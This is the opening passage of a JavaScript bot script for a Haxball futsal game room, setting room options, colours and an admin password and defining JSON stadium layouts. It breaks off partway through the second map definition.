	// Stats: "Auth" : '["0-Games", "1-Wins", "2-Draws", "3-Losses", "4-Winrate", "5-Goals", "6-Assists", "7-GK", "8-CS", "9-CS%", "10-Role", "11-Nick"]'

	/* VARIABLES */

	/* ROOM */

	const roomName = "𝐟𝐮𝐭𝐬𝐚𝐥 | 𝐱𝟑 |";
	const botName = "Referee";
	const maxPlayers = 25;
	const roomPublic = true;
	const geo = [{"lat": -22.9201, "lon": -43.3307, "code": "br"}, {"code": "FR", "lat": 46.2, "lon": 2.2}, {"code": "PL", "lat": 51.9, "lon": 19.1}, {"code": "GB", "lat": 55.3, "lon": -3.4}, {"code": "PT", "lat": 39.3, "lon": -8.2}];

	const room = HBInit({ roomName: roomName, maxPlayers: maxPlayers, public: roomPublic, playerName: botName, geo: geo[0] });

	const scoreLimitClassic = 3;
	const scoreLimitBig = 3;
	const timeLimitClassic = 3;
	const timeLimitBig = 3;

	room.setTeamsLock(true);

	let Cor = {
		Vermelho: 0xFA5646,
		Laranja: 0xFF5E3B,
		Verde: 0x7DFA89,
		Azul: 0x05C5FF,
		Amrelo: 0xFFFF17,
		Cinza: 0xCCCCCC,
		Branco: 0xFFFFFF,
		Azulclaro: 0x6ECAFF,
		Azulescuro: 0x426AD6
	}

	const Negrito = 'bold';
	const Normal = 'normal';
	const resetarAvatarEm = 3;

	var adminPassword = 4002;
	console.log("adminPassword : " + adminPassword);

	/* STADIUM */

	const playerRadius = 15;
	var ballRadius = 10;
	const triggerDistance = playerRadius + ballRadius + 0.01;
	var aloneMap = '{"name" : "𝐟𝐮𝐭𝐬𝐚𝐥 | Training |","width" : 420,"height" : 200,"spawnDistance" : 180,"bg" : { "width" : 368, "height" : 171, "kickOffRadius" : 65, "cornerRadius" : 0, "color" : "212733" },"vertexes" : [/* 0 */ { "x" : -368, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 1 */ { "x" : -368, "y" : 65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1, "color" : "FF3654" },/* 2 */ { "x" : -368, "y" : -65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1, "color" : "FF3654" },/* 3 */ { "x" : -368, "y" : -171, "trait" : "ballArea", "bCoef" : 1, "cMask" : ["ball" ] },/* 4 */ { "x" : 368, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 5 */ { "x" : 368, "y" : 65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1, "color" : "0A78FF" },/* 6 */ { "x" : 368, "y" : -65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1, "color" : "0A78FF" },/* 7 */ { "x" : 368, "y" : -171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 8 */ { "x" : 0, "y" : 65, "trait" : "kickOffBarrier", "_selected" : "segment" },/* 9 */ { "x" : 0, "y" : -65, "trait" : "line", "_selected" : "segment" },/* 10 */ { "bCoef" : 1, "trait" : "ballArea", "x" : 368, "y" : 171 },/* 11 */ { "bCoef" : 1, "trait" : "ballArea", "x" : 368, "y" : -171 },/* 12 */ { "bCoef" : 0, "trait" : "line", "x" : 0, "y" : 171 },/* 13 */ { "bCoef" : 0, "trait" : "line", "x" : 0, "y" : -171 },/* 14 */ { "x" : 0, "y" : 65, "trait" : "kickOffBarrier" },/* 15 */ { "x" : 0, "y" : -65, "trait" : "kickOffBarrier" },/* 16 */ { "x" : 377, "y" : -65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 17 */ { "x" : 377, "y" : -171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 18 */ { "x" : -377, "y" : -65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 19 */ { "x" : -377, "y" : -171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 20 */ { "x" : -377, "y" : 65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 21 */ { "x" : -377, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 22 */ { "x" : 377, "y" : 65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 23 */ { "x" : 377, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 24 */ { "x" : 0, "y" : 199, "trait" : "kickOffBarrier" },/* 25 */ { "x" : 0, "y" : 65, "trait" : "kickOffBarrier" },/* 26 */ { "x" : 0, "y" : -65, "trait" : "kickOffBarrier" },/* 27 */ { "x" : 0, "y" : -199, "trait" : "kickOffBarrier" },/* 28 */ { "x" : -368.53340356886, "y" : -62.053454903872, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,-80 ], "vis" : true },/* 29 */ { "x" : -400.05760771891, "y" : -62.053454903872, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,-80 ], "vis" : true },/* 30 */ { "x" : -400.05760771891, "y" : 64.043361696331, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,80 ] },/* 31 */ { "x" : -368.53340356886, "y" : 64.043361696331, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,80 ] },/* 32 */ { "x" : 368.09926357786, "y" : 63.94882446641, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,-80 ] },/* 33 */ { "x" : 400, "y" : 64, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,-80 ] },/* 34 */ { "x" : 400, "y" : -61.927767991658, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,80 ] },/* 35 */ { "x" : 368.9681846993, "y" : -62.144998272018, "cMask" : ["ball" ], "trait" : "goalNet", "curve" : 0, "color" : "F8F8F8", "pos" : [-700,80 ] },/* 36 */ { "x" : -368, "y" : -142.37229643041, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : -90 },/* 37 */ { "x" : -260.90035258157, "y" : -50.168480548544, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : 0 },/* 38 */ { "x" : -368, "y" : -160.81305960678, "bCoef" : 0.1, "trait" : "line", "curve" : -90 },/* 39 */ { "x" : -358.5379338963, "y" : -171, "bCoef" : 0.1, "trait" : "line", "curve" : -90 },/* 40 */ { "x" : -368, "y" : 141.33175243687, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : 90 },/* 41 */ { "x" : -260.90035258157, "y" : 49.127936555002, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : 0 },/* 42 */ { "x" : -368, "y" : 159.77251561324, "bCoef" : 0.1, "trait" : "line", "curve" : 90 },/* 43 */ { "x" : -358.5379338963, "y" : 171, "bCoef" : 0.1, "trait" : "line", "curve" : 90 },/* 44 */ { "x" : 368, "y" : 159.77251561324, "bCoef" : 0.1, "trait" : "line", "curve" : -90 },/* 45 */ { "x" : 358.36266315432, "y" : 171, "bCoef" : 0.1, "trait" : "line", "curve" : -90 },/* 46 */ { "x" : 368, "y" : -160.81305960678, "bCoef" : 0.1, "trait" : "line", "curve" : 90 },/* 47 */ { "x" : 358.36266315432, "y" : -171, "bCoef" : 0.1, "trait" : "line", "curve" : 90 },/* 48 */ { "x" : 368, "y" : -142.37229643041, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : 90 },/* 49 */ { "x" : 260.72508183959, "y" : -50.168480548544, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : 90 },/* 50 */ { "x" : 368, "y" : 141.33175243687, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : -90 },/* 51 */ { "x" : 260.72508183959, "y" : 49.127936555002, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : -90 },/* 52 */ { "x" : 260.72508183959, "y" : -50.168480548544, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : 0 },/* 53 */ { "x" : 260.72508183959, "y" : 49.127936555002, "bCoef" : 0.1, "trait" : "line", "color" : "F8F8F8", "curve" : 0 },/* 54 */ { "x" : -254.88159756902, "y" : -171, "bCoef" : 0.1, "trait" : "line" },/* 55 */ { "x" : -254.88159756902, "y" : -182.09086327183, "bCoef" : 0.1, "trait" : "line" },/* 56 */ { "x" : -371.91294503531, "y" : -87.759267023458, "bCoef" : 0.1, "trait" : "line" },/* 57 */ { "x" : -384.61920561736, "y" : -87.759267023458, "bCoef" : 0.1, "trait" : "line" },/* 58 */ { "x" : 371.73767429333, "y" : -87.759267023458, "bCoef" : 0.1, "trait" : "line" },/* 59 */ { "x" : 384.44393487538, "y" : -87.759267023458, "bCoef" : 0.1, "trait" : "line" },/* 60 */ { "x" : -371.91294503531, "y" : 86.718723029916, "bCoef" : 0.1, "trait" : "line" },/* 61 */ { "x" : -384.61920561736, "y" : 86.718723029916, "bCoef" : 0.1, "trait" : "line" },/* 62 */ { "x" : 371.73767429333, "y" : 86.718723029916, "bCoef" : 0.1, "trait" : "line" },/* 63 */ { "x" : 384.44393487538, "y" : 86.718723029916, "bCoef" : 0.1, "trait" : "line" },/* 64 */ { "x" : -254.88159756902, "y" : 171, "bCoef" : 0.1, "trait" : "line" },/* 65 */ { "x" : -254.88159756902, "y" : 181.05031927829, "bCoef" : 0.1, "trait" : "line" },/* 66 */ { "x" : 254.70632682704, "y" : -171, "bCoef" : 0.1, "trait" : "line" },/* 67 */ { "x" : 254.70632682704, "y" : -182.09086327183, "bCoef" : 0.1, "trait" : "line" },/* 68 */ { "x" : 254.70632682704, "y" : 171, "bCoef" : 0.1, "trait" : "line" },/* 69 */ { "x" : 254.70632682704, "y" : 181.05031927829, "bCoef" : 0.1, "trait" : "line" },/* 70 */ { "x" : 377, "y" : -65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 71 */ { "x" : 377, "y" : -171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 72 */ { "x" : -377, "y" : -65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 73 */ { "x" : -377, "y" : -171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 74 */ { "x" : -377, "y" : 65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 75 */ { "x" : -377, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 76 */ { "x" : 377, "y" : 65, "trait" : "line", "cMask" : ["ball" ], "bCoef" : 1 },/* 77 */ { "x" : 377, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 1 },/* 78 */ { "x" : 371, "y" : -65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 },/* 79 */ { "x" : 371, "y" : -171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 },/* 80 */ { "x" : 371, "y" : 65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 },/* 81 */ { "x" : 371, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 },/* 82 */ { "x" : -371, "y" : 65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 },/* 83 */ { "x" : -371, "y" : 171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 },/* 84 */ { "x" : -371, "y" : -65, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 },/* 85 */ { "x" : -371, "y" : -171, "trait" : "ballArea", "cMask" : ["ball" ], "bCoef" : 0 }],"segments" : [{ "v0" : 0, "v1" : 1, "trait" : "ballArea" },{ "v0" : 2, "v1" : 3, "trait" : "ballArea" },{ "v0" : 4, "v1" : 5, "trait" : "ballArea" },{ "v0" : 6, "v1" : 7, "trait" : "ballArea" },{ "v0" : 8, "v1" : 9, "trait" : "kickOffBarrier", "curve" : 180, "cGroup" : ["blueKO" ] },{ "v0" : 8, "v1" : 9, "trait" : "kickOffBarrier", "curve" : -180, "cGroup" : ["redKO" ] },{ "vis" : true, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 1, "v1" : 0, "cMask" : ["ball" ], "x" : -368 },{ "vis" : true, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 5, "v1" : 4, "cMask" : ["ball" ], "x" : 368 },{ "vis" : true, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 2, "v1" : 3, "cMask" : ["ball" ], "x" : -368 },{ "vis" : true, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 6, "v1" : 7, "cMask" : ["ball" ], "x" : 368 },{ "vis" : true, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 0, "v1" : 10, "y" : 171 },{ "vis" : true, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 3, "v1" : 11, "y" : -171 },{ "curve" : 0, "vis" : true, "color" : "FFFFFF", "bCoef" : 0, "trait" : "line", "v0" : 12, "v1" : 13 },{ "curve" : -180, "vis" : true, "color" : "FFFFFF", "bCoef" : 0, "trait" : "line", "v0" : 9, "v1" : 8, "_selected" : true },{ "curve" : 180, "vis" : true, "color" : "FFFFFF", "bCoef" : 0, "trait" : "line", "v0" : 15, "v1" : 14 },{ "curve" : 0, "vis" : true, "color" : "FF3654", "bCoef" : 0, "trait" : "line", "v0" : 2, "v1" : 1 },{ "curve" : 0, "vis" : true, "color" : "0A78FF", "bCoef" : 0, "trait" : "line", "v0" : 6, "v1" : 5 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 16, "v1" : 17, "cMask" : ["ball" ], "x" : 330 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 18, "v1" : 19, "cMask" : ["ball" ], "x" : -330 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 20, "v1" : 21, "cMask" : ["ball" ], "x" : -330 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 22, "v1" : 23, "cMask" : ["ball" ], "x" : 330 },{ "v0" : 24, "v1" : 25, "trait" : "kickOffBarrier" },{ "v0" : 26, "v1" : 27, "trait" : "kickOffBarrier" },{ "v0" : 28, "v1" : 29, "curve" : 0, "color" : "F8F8F8", "cMask" : ["ball" ], "trait" : "goalNet", "pos" : [-700,-80 ], "y" : -80, "vis" : true },{ "v0" : 29, "v1" : 30, "color" : "F8F8F8", "cMask" : ["ball" ], "trait" : "goalNet", "x" : -590 },{ "v0" : 30, "v1" : 31, "curve" : 0, "color" : "F8F8F8", "cMask" : ["ball" ], "trait" : "goalNet", "pos" : [-700,80 ], "y" : 80 },{ "v0" : 32, "v1" : 33, "curve" : 0, "color" : "F8F8F8", "cMask" : ["ball" ], "trait" : "goalNet", "pos" : [-700,-80 ], "y" : -80 },{ "v0" : 33, "v1" : 34, "color" : "F8F8F8", "cMask" : ["ball" ], "trait" : "goalNet", "x" : -590 },{ "v0" : 34, "v1" : 35, "curve" : 0, "color" : "F8F8F8", "cMask" : ["ball" ], "trait" : "goalNet", "pos" : [-700,80 ], "y" : 80 },{ "v0" : 36, "v1" : 37, "curve" : 94.0263701017, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 39, "v1" : 38, "curve" : 86.632306418889, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 40, "v1" : 41, "curve" : -94.026370101699, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 37, "v1" : 41, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 43, "v1" : 42, "curve" : -86.632306418888, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 45, "v1" : 44, "curve" : 86.632306418884, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 47, "v1" : 46, "curve" : -86.632306418899, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 48, "v1" : 49, "curve" : -94.026370101699, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 50, "v1" : 51, "curve" : 94.026370101699, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line" },{ "v0" : 52, "v1" : 53, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : 390 },{ "v0" : 54, "v1" : 55, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : -381 },{ "v0" : 56, "v1" : 57, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : -240, "y" : 123 },{ "v0" : 58, "v1" : 59, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : -240, "y" : 123 },{ "v0" : 60, "v1" : 61, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : -240, "y" : -123 },{ "v0" : 62, "v1" : 63, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : -240, "y" : -123 },{ "v0" : 64, "v1" : 65, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : -381 },{ "v0" : 66, "v1" : 67, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : 381 },{ "v0" : 68, "v1" : 69, "curve" : 0, "vis" : true, "color" : "F8F8F8", "bCoef" : 0.1, "trait" : "line", "x" : 381 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 70, "v1" : 71, "cMask" : ["ball" ], "x" : 330 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 72, "v1" : 73, "cMask" : ["ball" ], "x" : -330 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 74, "v1" : 75, "cMask" : ["ball" ], "x" : -330 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 1, "trait" : "ballArea", "v0" : 76, "v1" : 77, "cMask" : ["ball" ], "x" : 330 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 0, "trait" : "ballArea", "v0" : 78, "v1" : 79, "cMask" : ["ball" ], "x" : 371 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 0, "trait" : "ballArea", "v0" : 80, "v1" : 81, "cMask" : ["ball" ], "x" : 371 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 0, "trait" : "ballArea", "v0" : 82, "v1" : 83, "cMask" : ["ball" ], "x" : -371 },{ "vis" : false, "color" : "FFFFFF", "bCoef" : 0, "trait" : "ballArea", "v0" : 84, "v1" : 85, "cMask" : ["ball" ], "x" : -371 }],"goals" : [],"discs" : [{ "radius" : 3.9405255187564, "pos" : [-368.53340356886,64.043361696331 ], "color" : "FF6666", "trait" : "goalPost", "y" : 80 },{ "radius" : 3.9405255187564, "pos" : [-368.53340356886,-62.053454903872 ], "color" : "FF6666", "trait" : "goalPost", "y" : -80, "x" : -560 },{ "radius" : 3.9405255187564, "pos" : [368.9681846993,-62.144998272018 ], "color" : "6666FF", "trait" : "goalPost", "y" : 80 },{ "radius" : 3.9405255187564, "pos" : [368.09926357786,63.94882446641 ], "color" : "6666FF", "trait" : "goalPost", "y" : -80, "x" : -560 },{ "radius" : 3, "invMass" : 0, "pos" : [-368,-171 ], "color" : "FFCC00", "bCoef" : 0.1, "trait" : "line" },{ "radius" : 3, "invMass" : 0, "pos" : [-368,171 ], "color" : "FFCC00", "bCoef" : 0.1, "trait" : "line" },{ "radius" : 3, "invMass" : 0, "pos" : [368,171 ], "color" : "FFCC00", "bCoef" : 0.1, "trait" : "line" },{ "radius" : 3, "invMass" : 0, "pos" : [368,-171 ], "color" : "FFCC00", "bCoef" : 0.1, "trait" : "line" }],"planes" : [{ "normal" : [0,1 ], "dist" : -171, "trait" : "ballArea" },{ "normal" : [0,-1 ], "dist" : -171, "trait" : "ballArea" },{ "normal" : [0,1 ], "dist" : -200, "bCoef" : 0.2, "cMask" : ["all" ] },{ "normal" : [0,-1 ], "dist" : -200, "bCoef" : 0.2, "cMask" : ["all" ] },{ "normal" : [1,0 ], "dist" : -420, "bCoef" : 0.2, "cMask" : ["all" ] },{ "normal" : [-1,0 ], "dist" : -420, "bCoef" : 0.2, "cMask" : ["all" ] }],"traits" : {"ballArea" : { "vis" : false, "bCoef" : 1, "cMask" : ["ball" ] },"goalPost" : { "radius" : 8, "invMass" : 0, "bCoef" : 1 },"goalNet" : { "vis" : true, "bCoef" : 0.1, "cMask" : ["all" ] },"kickOffBarrier" : { "vis" : false, "bCoef" : 0.1, "cGroup" : ["redKO","blueKO" ], "cMask" : ["red","blue" ] },"line" : { "vis" : true, "bCoef" : 0, "cMask" : ["" ] },"arco" : { "radius" : 2, "cMask" : ["n/d" ], "color" : "cccccc" }},"playerPhysics" : {"acceleration" : 0.11,"kickingAcceleration" : 0.083,"kickStrength" : 5,"bCoef" : 0},"ballPhysics" : {"radius" : 6.25,"bCoef" : 0.4,"invMass" : 1.5,"damping" : 0.99,"color" : "B0D66E"}}'
	var classicMap = '{"name":"𝐟𝐮𝐭𝐬𝐚𝐥 x1 & x2 | Futsal |","width":420,"height":200,"spawnDistance":180,"bg":{"type":"hockey","width":368,"height":171,"kickOffRadius":65,"cornerRadius":0},"vertexes":[{"x":-368,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-368,"y":65,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-368,"y":-65,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-368,"y":-171,"trait":"ballArea","bCoef":1,"cMask":["ball"]},{"x":368,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":368,"y":65,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":368,"y":-65,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":368,"y":-171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":0,"y":65,"trait":"kickOffBarrier"},{"x":0,"y":-65,"trait":"line"},{"bCoef":1,"trait":"ballArea","x":368,"y":171},{"bCoef":1,"trait":"ballArea","x":368,"y":-171},{"bCoef":0,"trait":"line","x":0,"y":171},{"bCoef":0,"trait":"line","x":0,"y":-171},{"x":0,"y":65,"trait":"kickOffBarrier"},{"x":0,"y":-65,"trait":"kickOffBarrier"},{"x":377,"y":-65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":377,"y":-171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-377,"y":-65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":-377,"y":-171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-377,"y":65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":-377,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":377,"y":65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":377,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":0,"y":199,"trait":"kickOffBarrier"},{"x":0,"y":65,"trait":"kickOffBarrier"},{"x":0,"y":-65,"trait":"kickOffBarrier"},{"x":0,"y":-199,"trait":"kickOffBarrier"},{"x":-368.53340356886,"y":-62.053454903872,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-400.05760771891,"y":-62.053454903872,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-400.05760771891,"y":64.043361696331,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":-368.53340356886,"y":64.043361696331,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":368.09926357786,"y":63.94882446641,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":400,"y":64,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":400,"y":-61.927767991658,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":368.9681846993,"y":-62.144998272018,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":-368,"y":-142.37229643041,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":-260.90035258157,"y":-50.168480548544,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-368,"y":-160.81305960678,"bCoef":0.1,"trait":"line","curve":-90},{"x":-358.5379338963,"y":-171,"bCoef":0.1,"trait":"line","curve":-90},{"x":-368,"y":141.33175243687,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":-260.90035258157,"y":49.127936555002,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-368,"y":159.77251561324,"bCoef":0.1,"trait":"line","curve":90},{"x":-358.5379338963,"y":171,"bCoef":0.1,"trait":"line","curve":90},{"x":368,"y":159.77251561324,"bCoef":0.1,"trait":"line","curve":-90},{"x":358.36266315432,"y":171,"bCoef":0.1,"trait":"line","curve":-90},{"x":368,"y":-160.81305960678,"bCoef":0.1,"trait":"line","curve":90},{"x":358.36266315432,"y":-171,"bCoef":0.1,"trait":"line","curve":90},{"x":368,"y":-142.37229643041,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":260.72508183959,"y":-50.168480548544,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":368,"y":141.33175243687,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":260.72508183959,"y":49.127936555002,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":260.72508183959,"y":-50.168480548544,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":260.72508183959,"y":49.127936555002,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-250.86909422732,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":-160.58776903904,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":-160.58776903904,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":-80.337702205015,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":-80.337702205015,"y":-182.0